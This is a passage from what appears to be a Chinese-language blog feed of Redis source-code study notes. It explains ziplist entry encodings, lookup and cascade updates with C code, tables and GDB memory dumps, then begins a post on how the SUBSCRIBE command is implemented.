ZIPLIST_ENTRY_HEAD(zl)) &#123;	<span class="comment">// p为表头，说明前一个节点为NULL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ZIP_DECODE_PREVLEN(p, prevlensize, prevlen);	<span class="comment">// p减去这个节点的previous_entry_length</span></span><br><span class="line">        assert(prevlen &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> p-prevlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、当前节点编码信息-encoding，当前节点内容content"><a href="#2、当前节点编码信息-encoding，当前节点内容content" class="headerlink" title="2、当前节点编码信息 encoding，当前节点内容content"></a>2、当前节点编码信息 encoding，当前节点内容content</h4><p> <code>encoding</code>用于记录当前节点内容的实际类型（字符串还是整数），以及长度：</p>
<ul>
<li><code>encoding</code>长度可以是1字节、2字节、或5字节。其中<code>encoding</code>最高两位为00, 01, 或10时表示存储的值类型为字符串；<code>encoding</code>最高两位为11表示存储的值类型为整数。</li>
</ul>
<p>每一种<code>encoding</code>对应的编码长度和content类型，参考如下源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ziplist.c</span></span><br><span class="line"><span class="comment">/* Different encoding/length possibilities */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_MASK 0xc0			<span class="comment">// 11000000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_MASK 0x30			<span class="comment">// 00110000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_06B (0 &lt;&lt; 6)		<span class="comment">// 00bbbbbb （长度小于等于63）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_14B (1 &lt;&lt; 6)		<span class="comment">// 01bbbbbb bbbbbbbb  (长度大于63且小于等于16383)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_STR_32B (2 &lt;&lt; 6)		<span class="comment">// 10______ bbbbbbbb bbbbbbbb bbbbbbbb bbbbbbbb（长度大于16384）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_16B (0xc0 | 0&lt;&lt;4)	<span class="comment">// 11000000  16位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_32B (0xc0 | 1&lt;&lt;4)	<span class="comment">// 11010000  32位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_64B (0xc0 | 2&lt;&lt;4)	<span class="comment">// 11100000  64位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_24B (0xc0 | 3&lt;&lt;4)	<span class="comment">// 11110000  24位整数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_8B 0xfe				<span class="comment">// 11111110  8位整数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4 bit integer immediate encoding |1111xxxx| with xxxx between</span></span><br><span class="line"><span class="comment"> * 0001 and 1101. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MASK 0x0f   <span class="comment">/* Mask to extract the 4 bits value. To add</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                   one is needed to reconstruct the value. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MIN 0xf1    <span class="comment">/* 11110001 */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_INT_IMM_MAX 0xfd    <span class="comment">/* 11111101 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INT24_MAX 0x7fffff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INT24_MIN (-INT24_MAX - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Macro to determine if the entry is a string. String entries never start</span></span><br><span class="line"><span class="comment"> * with &quot;11&quot; as most significant bits of the first byte. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_IS_STR(enc) (((enc) &amp; ZIP_STR_MASK) &lt; ZIP_STR_MASK)  <span class="comment">// 判断是否为字节数组编码！！！</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extract the encoding from the byte pointed by &#x27;ptr&#x27; and set it into</span></span><br><span class="line"><span class="comment"> * &#x27;encoding&#x27; field of the zlentry structure. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_ENTRY_ENCODING(ptr, encoding) do &#123;  \</span></span><br><span class="line"><span class="meta">    (encoding) = (ptr[0]); \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((encoding) &lt; ZIP_STR_MASK) (encoding) &amp;= ZIP_STR_MASK; \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Decode the entry encoding type and data length (string length for strings,</span></span><br><span class="line"><span class="comment"> * number of bytes used for the integer for integer entries) encoded in &#x27;ptr&#x27;.</span></span><br><span class="line"><span class="comment"> * The &#x27;encoding&#x27; variable will hold the entry encoding, the &#x27;lensize&#x27;</span></span><br><span class="line"><span class="comment"> * variable will hold the number of bytes required to encode the entry</span></span><br><span class="line"><span class="comment"> * length, and the &#x27;len&#x27; variable will hold the entry length. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZIP_DECODE_LENGTH(ptr, encoding, lensize, len) do &#123;                    \</span></span><br><span class="line"><span class="meta">    ZIP_ENTRY_ENCODING((ptr), (encoding));                                     \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((encoding) &lt; ZIP_STR_MASK) &#123;                                           \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> ((encoding) == ZIP_STR_06B) &#123;                                       \</span></span><br><span class="line"><span class="meta">            (lensize) = 1;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = (ptr)[0] &amp; 0x3f;                                           \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((encoding) == ZIP_STR_14B) &#123;                                \</span></span><br><span class="line"><span class="meta">            (lensize) = 2;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = (((ptr)[0] &amp; 0x3f) &lt;&lt; 8) | (ptr)[1];                       \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((encoding) == ZIP_STR_32B) &#123;                                \</span></span><br><span class="line"><span class="meta">            (lensize) = 5;                                                     \</span></span><br><span class="line"><span class="meta">            (len) = ((ptr)[1] &lt;&lt; 24) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[2] &lt;&lt; 16) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[3] &lt;&lt;  8) |                                         \</span></span><br><span class="line"><span class="meta">                    ((ptr)[4]);                                                \</span></span><br><span class="line"><span class="meta">        &#125; <span class="keyword">else</span> &#123;                                                               \</span></span><br><span class="line"><span class="meta">            panic(<span class="string">&quot;Invalid string encoding 0x%02X&quot;</span>, (encoding));               \</span></span><br><span class="line"><span class="meta">        &#125;                                                                      \</span></span><br><span class="line"><span class="meta">    &#125; <span class="keyword">else</span> &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        (lensize) = 1;                                                         \</span></span><br><span class="line"><span class="meta">        (len) = zipIntSize(encoding);                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">&#125; while(0)</span></span><br></pre></td></tr></table></figure>

<p>整数编码：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">encoding长度</th>
<th align="left">content长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">11111110 (ZIP_INT_8B)</td>
<td align="left">1字节</td>
<td align="left">8位整数</td>
</tr>
<tr>
<td align="left">11000000 (ZIP_INT_16B)</td>
<td align="left">1字节</td>
<td align="left">16位整数</td>
</tr>
<tr>
<td align="left">11110000(ZIP_INT_24B)</td>
<td align="left">1字节</td>
<td align="left">24位整数</td>
</tr>
<tr>
<td align="left">11010000(ZIP_INT_32B)</td>
<td align="left">1字节</td>
<td align="left">32位整数</td>
</tr>
<tr>
<td align="left">11100000(ZIP_INT_64B)</td>
<td align="left">1字节</td>
<td align="left">64位整数</td>
</tr>
<tr>
<td align="left">1111xxxx</td>
<td align="left">1字节</td>
<td align="left">0-12之间的整数。此时没有content部分，值存储在encoding的xxxx四个位</td>
</tr>
</tbody></table>
<p>字节数组编码：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">encoding说明</th>
<th align="left">encoding长度</th>
<th align="left">content长度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">00xxxxxx (ZIP_STR_06B)</td>
<td align="left">后6位表示字节数组的长度</td>
<td align="left">1字节</td>
<td align="left">保存长度小于等于63字节的字节数组</td>
</tr>
<tr>
<td align="left">01xxxxxx xxxxxxxx (ZIP_STR_14B)</td>
<td align="left">后14位表示字节数组的长度</td>
<td align="left">2字节</td>
<td align="left">保存长度大于63， 小于等于16383字节的字节数组</td>
</tr>
<tr>
<td align="left">10______ xxxxxxxx xxxxxxxx xxxxxxxx xxxxxxxx (ZIP_STR_32B)</td>
<td align="left">最后24位表示字节数组的长度，第3-8位留空</td>
<td align="left">5字节</td>
<td align="left">保存长度大于16384，小于 2^32 - 1字节的字节数组</td>
</tr>
</tbody></table>
<p>总结：Redis根据ziplist节点存储内容的类型和大小，使用不同的编码表示，目的在于最大限度地节省空间。</p>
<p><font color = 'red'>思考问题：</font>创建一个ziplist编码的空列表键，并依次添加两个值”hello”，”10086”，问此时ziplist的长度是多少，内容是什么样的？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; info  # Redis版本必须为3.2之前的，否则列表键的默认编码为quicklist，而非ziplist!</span><br><span class="line"># Server redis_version:3.0.0</span><br><span class="line">127.0.0.1:6379&gt; flushdb</span><br><span class="line">127.0.0.1:6379&gt; rpush key hello 10086 # 新增列表键，依次插入两个key &quot;hello&quot; &quot;10086&quot;</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; object encoding key   # 确认列表键编码为ziplist</span><br><span class="line">&quot;ziplist&quot;</span><br></pre></td></tr></table></figure>

<p>如果你真的掌握了ziplist节点构成，那么不需要运行Redis，你也可以得出答案：这个ziplist占用22字节，内存如下图所示：<br><img src="/2021/12/30/2021-12-30-redis-note-04-ziplist/image4.png"><br>以下给出GDB的验证方法和验证结果，感兴趣的可以参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0、确认ziplist的首地址</span></span><br><span class="line">(gdb) p (sds)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">3</span>].key</span><br><span class="line">$<span class="number">1</span> = (sds) <span class="number">0x7fc6ac086288</span> <span class="string">&quot;key&quot;</span> <span class="comment">// 键</span></span><br><span class="line">(gdb) p *(robj *)server.db[<span class="number">0</span>].dict.ht[<span class="number">0</span>].table[<span class="number">3</span>].v</span><br><span class="line">$<span class="number">2</span> = &#123;type = <span class="number">1</span>, encoding = <span class="number">5</span>, lru = <span class="number">13392586</span>, refcount = <span class="number">1</span>, ptr = <span class="number">0x7fc6ac035d60</span>&#125; <span class="comment">// ptr即为ziplist的首地址！</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1、打印zlbytes, zltail, zllen</span></span><br><span class="line">(gdb) p *(<span class="type">int</span> *)<span class="number">0x7fc6ac035d60</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">22</span> <span class="comment">// zlbytes = 22</span></span><br><span class="line">(gdb) p *(<span class="type">int</span> *)<span class="number">0x7fc6ac035d64</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">17</span> <span class="comment">// zltail = 17</span></span><br><span class="line">(gdb) p *(<span class="type">short</span> *)<span class="number">0x7fc6ac035d68</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">2</span>  <span class="comment">// zlen = 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2、以下开始打印第一个节点</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d6a</span></span><br><span class="line"><span class="number">0x7fc6ac035d6a</span>: <span class="number">0x00</span> <span class="comment">// previous_entry_length本身占1字节，长度为0</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d6b</span></span><br><span class="line"><span class="number">0x7fc6ac035d6b</span>: <span class="number">0x05</span> <span class="comment">// encoding为00000101, 本身占1字节，表示长度为5的字节数组</span></span><br><span class="line">(gdb) x/<span class="number">5</span>c <span class="number">0x7fc6ac035d6c</span></span><br><span class="line"><span class="number">0x7fc6ac035d6c</span>: <span class="number">104</span> <span class="string">&#x27;h&#x27;</span> <span class="number">101</span> <span class="string">&#x27;e&#x27;</span> <span class="number">108</span> <span class="string">&#x27;l&#x27;</span> <span class="number">108</span> <span class="string">&#x27;l&#x27;</span> <span class="number">111</span> <span class="string">&#x27;o&#x27;</span>	<span class="comment">// content占5字节，存储&quot;hello&quot;</span></span><br><span class="line"><span class="comment">// 第一个节点总长度为 1 + 1 + 5 = 7 字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3、以下开始打印第二个节点</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d71</span></span><br><span class="line"><span class="number">0x7fc6ac035d71</span>: <span class="number">0x07</span> <span class="comment">// previous_entry_length本身占1字节，长度为7</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d72</span></span><br><span class="line"><span class="number">0x7fc6ac035d72</span>: <span class="number">0xc0</span> <span class="comment">// encoding为11000000, 本身占1字节, 表示16位的整数</span></span><br><span class="line">(gdb) p *(<span class="type">short</span> *) <span class="number">0x7fc6ac035d73</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">10086</span>	<span class="comment">// content本身占2字节，存储内容正是10086</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4、标志zlend，占1字节</span></span><br><span class="line">(gdb) x/xb <span class="number">0x7fc6ac035d75</span></span><br><span class="line"><span class="number">0x7fc6ac035d75</span>: <span class="number">0xff</span></span><br></pre></td></tr></table></figure>

<h3 id="为什么要设计ziplist"><a href="#为什么要设计ziplist" class="headerlink" title="为什么要设计ziplist"></a>为什么要设计ziplist<span id="jump3"></span></h3><p>还是考虑这个列表键： <code>&quot;hello&quot; -&gt; &quot;10086&quot;</code></p>
<ul>
<li>如果用ziplist编码，仅需22个字节存储。</li>
<li>如果用linkedlist编码，以64位环境为例，光链表节点就需要2 * sizeof(listNode) &#x3D; 48个字节，这个大小远超过了数据本身的大小，导致严重的内存浪费。</li>
</ul>
<p>可以看出，ziplist设计思想是以时间换空间，目的是节省宝贵的内存资源。</p>
<p>Redis中，ziplist是列表键和哈希键的底层实现之一，也用于quicklist的实现。</p>
<h3 id="ziplist相关操作"><a href="#ziplist相关操作" class="headerlink" title="ziplist相关操作"></a>ziplist相关操作<span id="jump4"></span></h3><p>压缩列表的增、删、改、查API如下：</p>
<table>
<thead>
<tr>
<th align="left">API</th>
<th align="left">功能</th>
<th align="left">时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ziplistPush</td>
<td align="left">插入指定节点到表头或表尾</td>
<td align="left">平均O(N)，连锁更新场景为O(N^2)</td>
</tr>
<tr>
<td align="left">ziplistDelete</td>
<td align="left">删除指定节点</td>
<td align="left">平均O(N)，连续更新场景为O(N^2)</td>
</tr>
<tr>
<td align="left">ziplistFind</td>
<td align="left">查找指定节点</td>
<td align="left">O(N^2)，因为节点值可能是字符串，而字符串比较复杂度为O(N)</td>
</tr>
<tr>
<td align="left">ziplistNext</td>
<td align="left">返回给定节点的下一个节点</td>
<td align="left">O(1)</td>
</tr>
<tr>
<td align="left">ziplistPrev</td>
<td align="left">返回给定节点的前一个节点</td>
<td align="left">O(1)</td>
</tr>
</tbody></table>
<h4 id="查找指定节点"><a href="#查找指定节点" class="headerlink" title="查找指定节点"></a>查找指定节点<span id="jump5"></span></h4><p>源码参考<code>ziplistFind</code>，时间复杂度为O(N^2)，因为节点值可能是字符串，而字符串比较复杂度为O(N)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 功能：寻找ziplist中，节点值和vstr相等的节点并返回</span></span><br><span class="line"><span class="comment">// skip表示跳过的节点数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *<span class="title function_">ziplistFind</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">char</span> *vstr, <span class="type">unsigned</span> <span class="type">int</span> vlen, <span class="type">unsigned</span> <span class="type">int</span> skip)</span> &#123;</span><br><span class="line">    <span class="type">int</span> skipcnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> vencoding = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> vll = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p[<span class="number">0</span>] != ZIP_END) &#123;	<span class="comment">// 如果没有达到列表尾，就一直循环遍历！</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> prevlensize, encoding, lensize, len;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *q;</span><br><span class="line"></span><br><span class="line">        ZIP_DECODE_PREVLENSIZE(p, prevlensize);</span><br><span class="line">        ZIP_DECODE_LENGTH(p + prevlensize, encoding, lensize, len);</span><br><span class="line">        q = p + prevlensize + lensize;	<span class="comment">// 此时q指向节点p的content</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skipcnt == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">/* Compare current entry with specified entry */</span></span><br><span class="line">            <span class="keyword">if</span> (ZIP_IS_STR(encoding)) &#123;	<span class="comment">// 如果是字符串，memcmp比较是否相等，复杂度O(N)</span></span><br><span class="line">                <span class="keyword">if</span> (len == vlen &amp;&amp; <span class="built_in">memcmp</span>(q, vstr, vlen) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> p;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* Find out if the searched field can be encoded. Note that</span></span><br><span class="line"><span class="comment">                 * we do it only the first time, once done vencoding is set</span></span><br><span class="line"><span class="comment">                 * to non-zero and vll is set to the integer value. */</span></span><br><span class="line">                <span class="comment">// 对于传入的vstr, 解码动作只需做一次， vencoding相当于一个flag</span></span><br><span class="line">                <span class="keyword">if</span> (vencoding == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!zipTryEncoding(vstr, vlen, &amp;vll, &amp;vencoding)) &#123;</span><br><span class="line">                        <span class="comment">/* If the entry can&#x27;t be encoded we set it to</span></span><br><span class="line"><span class="comment">                         * UCHAR_MAX so that we don&#x27;t retry again the next</span></span><br><span class="line"><span class="comment">                         * time. */</span></span><br><span class="line">                        vencoding = UCHAR_MAX;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* Must be non-zero by now */</span></span><br><span class="line">                    assert(vencoding);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Compare current entry with specified entry, do it only</span></span><br><span class="line"><span class="comment">                 * if vencoding != UCHAR_MAX because if there is no encoding</span></span><br><span class="line"><span class="comment">                 * possible for the field it can&#x27;t be a valid integer. */</span></span><br><span class="line">                <span class="comment">// 如果解码成功，比较整数值是否相等</span></span><br><span class="line">                <span class="keyword">if</span> (vencoding != UCHAR_MAX) &#123;</span><br><span class="line">                    <span class="type">long</span> <span class="type">long</span> ll = zipLoadInteger(q, encoding);</span><br><span class="line">                    <span class="keyword">if</span> (ll == vll) &#123;</span><br><span class="line">                        <span class="keyword">return</span> p;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Reset skip count */</span></span><br><span class="line">            skipcnt = skip;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Skip entry */</span></span><br><span class="line">            skipcnt--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Move to next entry */</span></span><br><span class="line">        <span class="comment">// q指向content, len就是content的长度, 所以 q + len即为下一个节点的首地址！！</span></span><br><span class="line">        p = q + len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="连锁更新问题"><a href="#连锁更新问题" class="headerlink" title="连锁更新问题"></a>连锁更新问题<span id="jump6"></span></h4><p>前面提到，ziplist中每个节点的<code>previous_entry_length</code>记录了前一个节点的长度，考虑在表头插入节点的场景：</p>
<p>如果列表所有节点长度都在250-253字节之前，且插入节点大于等于254字节，就会导致所有节点的<code>previous_entry_length</code>都必须从1字节扩展为5字节, 即触发了<strong>连锁更新</strong>。</p>
<p>以下举例说明这个问题：给定一个长度为3的，每个节点大小均为253字节的ziplist，往表头插入一个300字节大小的节点。<br><img src="/2021/12/30/2021-12-30-redis-note-04-ziplist/image5.png"><br>注：除了新增节点会引发连锁更新，删除节点操作也可能引发连锁更新，此处不再赘述。</p>
<p><font color = 'red'>思考问题：</font>既然连锁更新的最坏复杂度为O(n^2)，为什么Redis还是放心使用ziplist？</p>
<ul>
<li>因为连锁更新触发条件苛刻，只有满足存在多个连续长度为250-253之间的节点才能触发。</li>
<li>ziplist只应用于节点数少且数据小的场景，即使出现了连续更新，需要更新的节点数量也很少，不会出现性能问题。</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】《Redis设计与实现》 第7章 压缩列表</p>
<p>【2】[Redis源码解析-基础数据-ziplist(压缩列表)](</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis发布与订阅源码分析</title>
    <url>/2022/01/29/2022-01-29-redis-pubsub-study/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过阅读Redis源码，配合GDB和抓包等调试手段，分析Redis发布订阅的实现原理，思考相关问题。</p>
<p><strong>源码版本：</strong><a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<span id="more"></span>

<h2 id="思考问题"><a href="#思考问题" class="headerlink" title="思考问题"></a>思考问题</h2><ul>
<li><a href="#jump0">发布订阅基本概念介绍</a></li>
<li><a href="#jump1">订阅频道 —— SUBSCRIBE命令的实现</a></li>
<li><a href="#jump2">退订频道 —— USUBSCRIBE命令的实现</a></li>
<li><a href="#jump3">订阅模式 —— PSUBSCRIBE命令的实现</a></li>
<li><a href="#jump4">退订模式 —— PUNSUBSCRIBE命令的实现</a></li>
<li><a href="#jump5">发送消息 —— PUBLISH命令的实现</a><ul>
<li><a href="#jump6">Redis发布订阅的特点</a></li>
<li><a href="#jump7">为什么设计pubsub_patterns_dict字典？</a></li>
</ul>
</li>
<li><a href="#jump10">一次完整的Redis订阅、发布流程分析</a><ul>
<li><a href="#jump11">为什么redis-cli中执行了subscribe命令后无法再执行unsubscribe命令？</a></li>
<li><a href="#jump12">TCP是没有消息边界的，订阅者是如何保证正确解析发布者的消息?</a></li>
<li><a href="#jump8">订阅的客户端断线，服务端是怎么感知的？如何保证这个客户端的频道、模式订阅信息也被同步删除？</a></li>
<li><a href="#jump9">服务器正常关闭场景，正在订阅的客户端是怎么感知到服务器离线的？</a></li>
</ul>
</li>
<li>查看订阅消息</li>
</ul>
<h3 id="发布订阅基本概念介绍"><a href="#发布订阅基本概念介绍" class="headerlink" title="发布订阅基本概念介绍"></a>发布订阅基本概念介绍<span id="jump0"></span></h3><p>Redis的发布订阅功能由SUBSCRIBE，PSUBSCRIBE，PUBLISH等命令组成，每个命令对应的功能和相关源码参考下表：</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
<th align="left">相关源码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">subscribe</td>
<td align="left">订阅一个或多个频道</td>
<td align="left">subscribeCommand</td>
</tr>
<tr>
<td align="left">unsubscribe</td>
<td align="left">解除一个或多个频道的订阅</td>
<td align="left">unsubscribeCommand</td>
</tr>
<tr>
<td align="left">psubscribe</td>
<td align="left">订阅一个或多个模式</td>
<td align="left">psubscribeCommand</td>
</tr>
<tr>
<td align="left">punsubscribe</td>
<td align="left">解除一个或多个模式的订阅</td>
<td align="left">punsubscribeCommand</td>
</tr>
<tr>
<td align="left">publish</td>
<td align="left">发送信息到指定频道</td>
<td align="left">pubsubCommand</td>
</tr>
<tr>
<td align="left">pubsub</td>
<td align="left">查看订阅信息</td>
<td align="left">pubsubCommand</td>
</tr>
</tbody></table>
<p>Redis发布订阅的示例可参考<a href="https://www.runoob.com/redis/redis-pub-sub.html">菜鸟教程 Redis 发布订阅</a></p>
<h3 id="订阅频道-——-SUBSCRIBE命令的实现"><a href="#订阅频道-——-SUBSCRIBE命令的实现" class="headerlink" title="订阅频道 —— SUBSCRIBE命令的实现"></a>订阅频道 —— SUBSCRIBE命令的实现<span id="jump1"></span></h3><p>客户端向Redis服务器发送SUBSCRIBE命令，Redis服务器收到客户端的订阅请求，将频道的订阅关系保存在字典<code>pubsub_channels</code>中，数据结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> <span class="title">server</span>;</span>	<span class="comment">/* Server global state, server.c */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span> <span class="comment">// server.h</span></span><br><span class="line">	dict *pubsub_channels;  <span class="comment">/* Map channels to list of subscribed clients */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>pubsub_channels</code>字典的键表示频道，为字符串类型，字典的值为一个链表，保存所有订阅了这个频道的客户端。</p>
<p>每当一个客户端执行<code>SUBSCRIBE channel</code>命令后，服务端将执行如下操作：</p>
<ul>
<li>如果<code>pubsub_channel</code>字典不包含<code>channel</code>这个键，说明<font color = 'blue'>此时这个频道还没有任何订阅者</font>，此时服务端将首先在字典中创建一个叫<code>channel</code>的键，值初始成一个空链表，然后将这个客户端加入空链表。</li>
<li>如果<code>pubsub_channel</code>字典包含<code>channel</code>这个键，说明<font color = 'blue'>此时这个频道已经有1个或多个订阅者</font>，此时服务端在字典中找到这个键对应的链表，再将这个客户端加入链表末尾。</li>
</ul>
<p>举例：有4个客户端(client1~client4)，其中client1, client2订阅<code>channel1</code>, client3, client4订阅<code>channel2</code>，此时，<code>pubsub_channels</code>字典可以是下图所示：<br><img src="/2022/01/29/2022-01-29-redis-pubsub-study/image1.png"></p>
<h5 id="GDB打印频道字典pubsub-channels的方法"><a href="#GDB打印频道字典pubsub-channels的方法" class="headerlink" title="GDB打印频道字典pubsub_channels的方法"></a><a href="#jumpx">GDB打印频道字典<code>pubsub_channels</code>的方法</a></h5><p>订阅频道的源码实现参考<code>pubsub.c/subscribeCommand</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">subscribeCommand</span><span class="params">(client *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; c-&gt;argc; j++)</span><br><span class="line">        pubsubSubscribeChannel(c,c-&gt;argv[j]);</span><br><span class="line">    c-&gt;flags |= CLIENT_PUBSUB;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Subscribe a client to a channel. Returns 1 if the operation succeeded, or</span></span><br><span class="line"><span class="comment"> * 0 if the client was already subscribed to that channel. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pubsubSubscribeChannel</span><span class="params">(client *c, robj *channel)</span> &#123;</span><br><span class="line">    dictEntry *de;</span><br><span class="line">    <span class="built_in">list</span> *clients = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dictAdd(c-&gt;pubsub_channels,channel,<span class="literal">NULL</span>) == DICT_OK) &#123;</span><br><span class="line">        retval = <span class="number">1</span>;</span><br><span class="line">        incrRefCount(channel);</span><br><span class="line">        <span class="comment">/* Add the client to the channel -&gt; list of clients hash table */</span></span><br><span class="line">        de = dictFind(server.pubsub_channels,channel);</span><br><span class="line">        <span class="keyword">if</span> (de == <span class="literal">NULL</span>) &#123; <span class="comment">// 说明channel还没有任何订阅者，需先在字典中新增channel键，再初始化1个链表，并将客户端加入链表</span></span><br><span class="line">            clients = listCreate();</span><br><span class="line">            dictAdd(server.pubsub_channels,channel,clients);</span><br><span class="line">            incrRefCount(channel);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 说明channel已有1个或多个订阅者，直接将这个客户端加入链表即可</span></span><br><span class="line">            clients = dictGetVal(de);</span><br><span class="line">        &#125;</span><br><span class="line">        listAddNodeTail(clients,c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Notify the client */</span></span><br><span class="line">    addReplyPubsubSubscribed(c,channel);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



